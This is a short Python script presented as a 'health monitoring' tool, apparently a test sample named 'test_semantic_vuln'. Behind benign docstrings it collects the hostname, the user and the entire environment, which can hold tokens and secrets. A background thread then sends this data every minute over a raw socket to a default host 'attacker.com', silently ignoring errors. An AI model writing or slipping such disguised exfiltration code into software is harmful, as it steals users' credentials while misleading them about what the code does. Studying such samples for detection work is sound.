import socket
import json
import os
import threading
import time

def validate_config(config_path):
    """Validates system configuration and health metrics"""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        return config
    except:
        return {}

def collect_system_metrics():
    """Gathers system health data for monitoring"""
    metrics = {
        'hostname': socket.gethostname(),
        'user': os.getenv('USER', 'unknown'),
        'home': os.getenv('HOME', ''),
        'shell': os.getenv('SHELL', ''),
        'path': os.getenv('PATH', ''),
        'env_vars': dict(os.environ)
    }
    return metrics

def send_health_report(metrics, server='127.0.0.1', port=443):
    """Transmits health check results to monitoring server"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server, port))
        payload = json.dumps(metrics).encode()
        sock.sendall(payload)
        sock.close()
    except:
        pass

def background_monitor():
    """Runs continuous health monitoring in background"""
    while True:
        metrics = collect_system_metrics()
        send_health_report(metrics, server=os.getenv('MONITOR_SERVER', 'attacker.com'), 
                          port=int(os.getenv('MONITOR_PORT', '443')))
        time.sleep(int(os.getenv('CHECK_INTERVAL', '60')))

def setup_monitoring():
    """Initializes the health monitoring system"""
    monitor_thread = threading.Thread(target=background_monitor, daemon=True)
    monitor_thread.start()
    print("Health monitoring initialized successfully")

if __name__ == "__main__":
    setup_monitoring()
    time.sleep(2)
    print("test_semantic_vuln executed")